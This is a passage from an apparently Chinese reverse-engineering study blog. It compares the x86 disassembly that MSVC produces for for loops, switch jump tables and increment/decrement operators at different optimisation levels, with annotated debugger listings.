esp,0x4</span><br><span class=\"line\">00F714B3    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F714B5    E8 8BFCFFFF     call    00F71145</span><br><span class=\"line\">00F714BA &gt;  33C0            xor     eax,eax</span><br><span class=\"line\">00F714BC    5F              pop     edi</span><br><span class=\"line\">00F714BD    5E              pop     esi</span><br><span class=\"line\">00F714BE    5B              pop     ebx</span><br><span class=\"line\">00F714BF    81C4 D0000000   add     esp,0xD0</span><br><span class=\"line\">00F714C5    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00F714C7    E8 79FCFFFF     call    00F71145</span><br><span class=\"line\">00F714CC    8BE5            mov     esp,ebp</span><br><span class=\"line\">00F714CE    5D              pop     ebp</span><br><span class=\"line\">00F714CF    C3              retn</span><br><span class=\"line\">\t</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果 a=9, 9-1=8<br>\ndb 8+0xF714EC   ==  4      db 8+0xF714EC</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221119102654407.png\" alt=\"image-20221119102654407\"><a href=\"\"></a></p>\n<p>dd 4 * 4 + 0xF714D0 ==</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221119102748365.png\" alt=\"image-20221119102748365\">\\</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221119102822429.png\" alt=\"image-20221119102822429\">`</p>\n<p>也就是说 F714EC 中存放的就是导出表</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221119103208537.png\" alt=\"image-20221119103208537\">·</p>\n</blockquote>\n</blockquote>\n<h4 id=\"for\"><a class=\"markdownIt-Anchor\" href=\"#for\">#</a> for</h4>\n<blockquote>\n<p>for 循环</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for (int i=1;i&lt;=10;++i) &#123;</span><br><span class=\"line\">\tprintf(&quot;%d&quot;,i);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>debug，禁止优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">013013BE    C745 F8 0100000&gt;mov     dword ptr ss:[ebp-0x8],0x1</span><br><span class=\"line\">013013C5    EB 09           jmp     short 013013D0</span><br><span class=\"line\">013013C7    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">013013CA    83C0 01         add     eax,0x1</span><br><span class=\"line\">013013CD    8945 F8         mov     dword ptr ss:[ebp-0x8],eax</span><br><span class=\"line\">013013D0    837D F8 0A      cmp     dword ptr ss:[ebp-0x8],0xA</span><br><span class=\"line\">013013D4    7F 1D           jg      short 013013F3</span><br><span class=\"line\">013013D6    8BF4            mov     esi,esp</span><br><span class=\"line\">013013D8    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">013013DB    50              push    eax</span><br><span class=\"line\">013013DC    68 3C573001     push    0130573C                                ; ASCII &quot;%d&quot;</span><br><span class=\"line\">013013E1    FF15 BC823001   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">013013E7    83C4 08         add     esp,0x8</span><br><span class=\"line\">013013EA    3BF4            cmp     esi,esp</span><br><span class=\"line\">013013EC    E8 54FDFFFF     call    01301145</span><br><span class=\"line\">013013F1  ^ EB D4           jmp     short 013013C7</span><br><span class=\"line\">013013F3    33C0            xor     eax,eax    \t\t\t\t\t\t\t\t;eax清零，作为返回值</span><br><span class=\"line\">013013F5    5F              pop     edi</span><br><span class=\"line\">013013F6    5E              pop     esi</span><br><span class=\"line\">013013F7    5B              pop     ebx</span><br><span class=\"line\">013013F8    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">013013FE    3BEC            cmp     ebp,esp</span><br><span class=\"line\">01301400    E8 40FDFFFF     call    01301145</span><br><span class=\"line\">01301405    8BE5            mov     esp,ebp</span><br><span class=\"line\">01301407    5D              pop     ebp                              </span><br><span class=\"line\">01301408    C3              retn</span><br></pre></td></tr></table></figure>\n<p>release，O/2 优化</p>\n<p>最大化速度优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00361000 &gt;/$  56            push    esi</span><br><span class=\"line\">00361001  |.  68 84B33600   push    0036B384                              ; /format = &quot;shabi&quot;</span><br><span class=\"line\">00361006  |.  E8 2F000000   call    printf                                ; \\printf</span><br><span class=\"line\">0036100B  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">0036100E  |.  BE 01000000   mov     esi,0x1</span><br><span class=\"line\">00361013  |&gt;  56            /push    esi                                  ; /&lt;%d&gt;</span><br><span class=\"line\">00361014  |.  68 8CB33600   |push    0036B38C                             ; |format = &quot;%d&quot;</span><br><span class=\"line\">00361019  |.  E8 1C000000   |call    printf                               ; \\printf</span><br><span class=\"line\">0036101E  |.  46            |inc     esi</span><br><span class=\"line\">0036101F  |.  83C4 08       |add     esp,0x8</span><br><span class=\"line\">00361022  |.  83FE 0A       |cmp     esi,0xA</span><br><span class=\"line\">00361025  |.^ 7E EC         \\jle     short 00361013</span><br><span class=\"line\">00361027  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00361029  |.  5E            pop     esi</span><br><span class=\"line\">0036102A  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>release，O/1 优化</p>\n<p>大小最小化优化情况下，for</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01161000 &gt;/$  56            push    esi</span><br><span class=\"line\">01161001  |.  57            push    edi\t\t\t\t\t\t\t\t\t\t ; 保护edi</span><br><span class=\"line\">01161002  |.  8B3D A0201601 mov     edi,dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]     ;  printf给edi，调用时直接call edi，用寄存器代替内存</span><br><span class=\"line\">01161008  |.  68 F4201601   push    011620F4                                 ; /format = &quot;shabi&quot;，printf参数入栈</span><br><span class=\"line\">0116100D  |.  FFD7          call    edi                                      ; call printf</span><br><span class=\"line\">0116100F  |.  33F6          xor     esi,esi\t\t\t\t\t\t\t\t\t ; esi = 0</span><br><span class=\"line\">01161011  |.  59            pop     ecx\t\t\t\t\t\t\t\t\t\t ; 堆栈平衡，可以理解为esp+4</span><br><span class=\"line\">01161012  |.  46            inc     esi</span><br><span class=\"line\"></span><br><span class=\"line\">//循环代码段</span><br><span class=\"line\">01161013  |&gt;  56            /push    esi\t\t\t\t\t\t\t\t\t ; i 入栈</span><br><span class=\"line\">01161014  |.  68 FC201601   |push    011620FC                                ;  ASCII &quot;%d&quot;入栈</span><br><span class=\"line\">01161019  |.  FFD7          |call    edi\t\t\t\t\t\t\t\t\t ; call printf 编译器判断第一次可以执行，直接优化</span><br><span class=\"line\">0116101B  |.  46            |inc     esi</span><br><span class=\"line\">0116101C &gt;|.  83FE 0A       |cmp     esi,0xA</span><br><span class=\"line\">0116101F  |.  59            |pop     ecx</span><br><span class=\"line\">01161020  |.  59            |pop     ecx \t\t\t\t\t\t\t\t\t ; 两次pop堆栈平衡 esp+8</span><br><span class=\"line\">01161021  |.^ 7E F0         \\jle     short 01161013</span><br><span class=\"line\"></span><br><span class=\"line\">01161023  |.  5F            pop     edi</span><br><span class=\"line\">01161024  |.  33C0          xor     eax,eax</span><br><span class=\"line\">01161026 &gt;|.  5E            pop     esi</span><br><span class=\"line\">01161027  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">//inc 一个字节，pop edi一个字节，</span><br><span class=\"line\">//add 三个字节，</span><br></pre></td></tr></table></figure>\n<p>release，关闭优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00191000 &gt; $  55            push    ebp</span><br><span class=\"line\">00191001   .  8BEC          mov     ebp,esp</span><br><span class=\"line\">00191003   .  51            push    ecx</span><br><span class=\"line\">//这个ecx在最后没有出栈，所以不是用来保护的，而是用来分配堆栈空间的</span><br><span class=\"line\"></span><br><span class=\"line\">00191004   .  C745 FC 01000&gt;mov     dword ptr ss:[ebp-0x4],0x1</span><br><span class=\"line\">0019100B   .  EB 09         jmp     short 00191016</span><br><span class=\"line\">0019100D   &gt;  8B45 FC       mov     eax,dword ptr ss:[ebp-0x4]</span><br><span class=\"line\">00191010   .  83C0 01       add     eax,0x1</span><br><span class=\"line\">00191013   .  8945 FC       mov     dword ptr ss:[ebp-0x4],eax</span><br><span class=\"line\">00191016   &gt;  837D FC 0A    cmp     dword ptr ss:[ebp-0x4],0xA</span><br><span class=\"line\">0019101A   .  7F 14         jg      short 00191030</span><br><span class=\"line\">0019101C   .  8B4D FC       mov     ecx,dword ptr ss:[ebp-0x4]</span><br><span class=\"line\">0019101F   .  51            push    ecx         \t\t\t\t\t ;  根据从右到左的入栈数据，i先入栈，%d后入</span><br><span class=\"line\">00191020   .  68 F4201900   push    001920F4                         ;  ASCII &quot;%d&quot;</span><br><span class=\"line\">00191025      FF            db      FF</span><br><span class=\"line\">00191026 &gt; .  15 A0201900   adc     eax,&lt;&amp;MSVCR90.printf&gt;</span><br><span class=\"line\">0019102B   .  83C4 08       add     esp,0x8  \t\t\t\t\t\t ;  printf有两个参数，因此堆栈平衡时需要+8</span><br><span class=\"line\">0019102E   .^ EB DD         jmp     short 0019100D</span><br><span class=\"line\">00191030   &gt;  33C0          xor     eax,eax\t\t\t\t\t\t\t ;  eax作为函数返回值，此处将eax清零</span><br><span class=\"line\">00191032   .  8BE5          mov     esp,ebp</span><br><span class=\"line\">00191034   .  5D            pop     ebp</span><br><span class=\"line\">00191035 &gt; .  C3            retn</span><br></pre></td></tr></table></figure>\n<p>release，完全优化 / Ox</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010E1000 &gt;/$  56            push    esi</span><br><span class=\"line\">010E1001  |.  68 84B30E01   push    010EB384                         ; /format = &quot;shabi&quot;</span><br><span class=\"line\">010E1006  |.  E8 2F000000   call    printf                           ; \\printf</span><br><span class=\"line\">010E100B  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">010E100E  |.  BE 01000000   mov     esi,0x1</span><br><span class=\"line\">010E1013  |&gt;  56            /push    esi                             ; /&lt;%d&gt;</span><br><span class=\"line\">010E1014  |.  68 8CB30E01   |push    010EB38C                        ; |format = &quot;%d&quot;</span><br><span class=\"line\">010E1019  |.  E8 1C000000   |call    printf                          ; \\printf</span><br><span class=\"line\">010E101E  |.  46            |inc     esi</span><br><span class=\"line\">010E101F  |.  83C4 08       |add     esp,0x8</span><br><span class=\"line\">010E1022  |.  83FE 0A       |cmp     esi,0xA</span><br><span class=\"line\">010E1025  |.^ 7E EC         \\jle     short 010E1013</span><br><span class=\"line\">010E1027  |.  33C0          xor     eax,eax</span><br><span class=\"line\">010E1029  |.  5E            pop     esi</span><br><span class=\"line\">010E102A  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h4 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> ++ –</h4>\n<blockquote>\n<p>inc a  //i++  ++i  速度比 add 快，占用空间小，指令执行影响 AS，OF，PF，SF，ZF 标志位，不影响 CF</p>\n<p>dec a</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010E100B  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">01161012  |.  46            inc     esi</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tint i=0;</span><br><span class=\"line\">\ti++;</span><br><span class=\"line\">\ti--;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">003A1000 &gt;/$  55            push    ebp</span><br><span class=\"line\">003A1001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">003A1003  |.  51            push    ecx</span><br><span class=\"line\">003A1004  |.  68 F4203A00   push    003A20F4                         ; /format = &quot;shabi&quot;</span><br><span class=\"line\">003A1009  |.  FF15 A0203A00 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf</span><br><span class=\"line\">003A100F  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">003A1012  |.  C745 FC 00000&gt;mov     [local.1],0x0</span><br><span class=\"line\">003A1019  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">003A101C  |.  83C0 01       add     eax,0x1</span><br><span class=\"line\">003A101F  |.  8945 FC       mov     [local.1],eax</span><br><span class=\"line\">003A1022  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">003A1025  |.  83E9 01       sub     ecx,0x1</span><br><span class=\"line\">003A1028  |.  894D FC       mov     [local.1],ecx</span><br><span class=\"line\">003A102B  |.  33C0          xor     eax,eax</span><br><span class=\"line\">003A102D  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">003A102F  |.  5D            pop     ebp</span><br><span class=\"line\">003A1030  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>速度最大化的时候因为 i 没有实际用途，所以直接返回</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01251000 &gt;/$  68 F4202501   push    012520F4                         ; /format = &quot;shabi&quot;</span><br><span class=\"line\">01251005  |.  FF15 A0202501 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;] ; \\printf</span><br><span class=\"line\">0125100B  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">0125100E  |.  33C0          xor     eax,eax</span><br><span class=\"line\">01251010  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01201000 &gt;/$  56            push    esi</span><br><span class=\"line\">01201001  |.  8B35 A0202001 mov     esi,dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]   ;  msvcr90.printf</span><br><span class=\"line\">01201007  |.  68 F4202001   push    012020F4                               ; /format = &quot;shabi&quot;</span><br><span class=\"line\">0120100C  |.  FFD6          call    esi                                    ; \\printf</span><br><span class=\"line\">0120100E  |.  6A 01         push    0x1</span><br><span class=\"line\">01201010  |.  68 FC202001   push    012020FC                               ;  ASCII &quot;%d&quot;</span><br><span class=\"line\">01201015  |.  FFD6          call    esi</span><br><span class=\"line\">01201017  |.  6A 00         push    0x0</span><br><span class=\"line\">01201019  |.  68 FC202001   push    012020FC                               ;  ASCII &quot;%d&quot;</span><br><span class=\"line\">0120101E  |.  FFD6          call    esi</span><br><span class=\"line\">01201020  |.  83C4 14       add     esp,0x14\t\t\t\t\t\t\t   ; 堆栈平衡，2+2+1=20/4</span><br><span class=\"line\">01201023  |.  33C0          xor     eax,eax</span><br><span class=\"line\">01201025  |.  5E            pop     esi</span><br><span class=\"line\">01201026  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">//添加打印i后的代码</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012B1000 &gt;/$  51            push    ecx</span><br><span class=\"line\">012B1001  |.  56            push    esi</span><br><span class=\"line\">012B1002  |.  8B35 A0202B01 mov     esi,dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]         ;  msvcr90.printf</span><br><span class=\"line\">012B1008  |.  57            push    edi</span><br><span class=\"line\">012B1009  |.  68 F4202B01   push    012B20F4                                     ; /format = &quot;shabi&quot;</span><br><span class=\"line\">012B100E  |.  FFD6          call    esi                                          ; \\printf</span><br><span class=\"line\">012B1010  |.  8B7C24 0C     mov     edi,dword ptr ss:[esp+0xC]                   ;  msvcr90.__winitenv</span><br><span class=\"line\">012B1014  |.  47            inc     edi</span><br><span class=\"line\">012B1015  |.  57            push    edi</span><br><span class=\"line\">012B1016  |.  68 FC202B01   push    012B20FC                                     ;  ASCII &quot;%d&quot;</span><br><span class=\"line\">012B101B  |.  FFD6          call    esi</span><br><span class=\"line\">012B101D  |.  4F            dec     edi</span><br><span class=\"line\">012B101E  |.  57            push    edi</span><br><span class=\"line\">012B101F  |.  68 FC202B01   push    012B20FC                                     ;  ASCII &quot;%d&quot;</span><br><span class=\"line\">012B1024  |.  FFD6          call    esi</span><br><span class=\"line\">012B1026  |.  83C4 14       add     esp,0x14</span><br><span class=\"line\">012B1029  |.  5F            pop     edi</span><br><span class=\"line\">012B102A  |.  33C0          xor     eax,eax</span><br><span class=\"line\">012B102C  |.  5E            pop     esi</span><br><span class=\"line\">012B102D  |.  59            pop     ecx</span><br><span class=\"line\">012B102E  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">//如果不赋初值的话</span><br></pre></td></tr></table></figure>\n<p>前<ins>后</ins>（–）的区别</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tint i;</span><br><span class=\"line\">\ti++;</span><br><span class=\"line\">\tprintf(&quot;%d&quot;,i);</span><br><span class=\"line\">\ti--;</span><br><span class=\"line\">\tprintf(&quot;%d&quot;,i);</span><br><span class=\"line\"></span><br><span class=\"line\">\tint j=0;</span><br><span class=\"line\">\tj=i++;</span><br><span class=\"line\">\tprintf(&quot;i++%d&quot;,j);</span><br><span class=\"line\">\tj=++i;</span><br><span class=\"line\">\tprintf(&quot;++i%d&quot;,j);</span><br><span class=\"line\">\tj=i--;</span><br><span class=\"line\">\tprintf(&quot;i--%d&quot;,j);</span><br><span class=\"line\">\tj=--i;</span><br><span class=\"line\">\tprintf(&quot;--i%d&quot;,j);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>禁止优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01281000 &gt;/$  55            push    ebp</span><br><span class=\"line\">01281001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">01281003  |.  83EC 08       sub     esp,0x8</span><br><span class=\"line\">01281006  |.  68 F4202801   push    012820F4                                  ; /format = &quot;shabi&quot;</span><br><span class=\"line\">0128100B  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">01281011  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">01281014  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">01281017  |.  83C0 01       add     eax,0x1</span><br><span class=\"line\">0128101A  |.  8945 FC       mov     [local.1],eax</span><br><span class=\"line\">0128101D  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">01281020  |.  51            push    ecx                                       ; /&lt;%d&gt;</span><br><span class=\"line\">01281021  |.  68 FC202801   push    012820FC                                  ; |format = &quot;%d&quot;</span><br><span class=\"line\">01281026  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">0128102C  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">0128102F  |.  8B55 FC       mov     edx,[local.1]</span><br><span class=\"line\">01281032  |.  83EA 01       sub     edx,0x1</span><br><span class=\"line\">01281035  |.  8955 FC       mov     [local.1],edx</span><br><span class=\"line\">01281038  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">0128103B  |.  50            push    eax                                       ; /&lt;%d&gt;</span><br><span class=\"line\">0128103C  |.  68 00212801   push    01282100                                  ; |format = &quot;%d&quot;</span><br><span class=\"line\">01281041  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">01281047  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">0128104A  |.  C745 F8 00000&gt;mov     [local.2],0x0</span><br><span class=\"line\">01281051  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">01281054  |.  894D F8       mov     [local.2],ecx</span><br><span class=\"line\">01281057  |.  8B55 FC       mov     edx,[local.1]</span><br><span class=\"line\">0128105A  |.  83C2 01       add     edx,0x1</span><br><span class=\"line\">0128105D  |.  8955 FC       mov     [local.1],edx</span><br><span class=\"line\">01281060  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">01281063  |.  50            push    eax                                       ; /&lt;%d&gt;</span><br><span class=\"line\">01281064  |.  68 04212801   push    01282104                                  ; |format = &quot;i++%d&quot;</span><br><span class=\"line\">01281069  |.  FF15 A0202801 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]          ; \\printf</span><br><span class=\"line\">0128106F  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">01281072  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">01281075  |.  83C1 01       add     ecx,0x1</span><br><span class=\"line\">01281078  |.  894D FC       mov     [local.1],ecx</span><br><span class=\"line\">0128107B  |.  8B55 FC       mov     edx,[local.1]</span><br><span 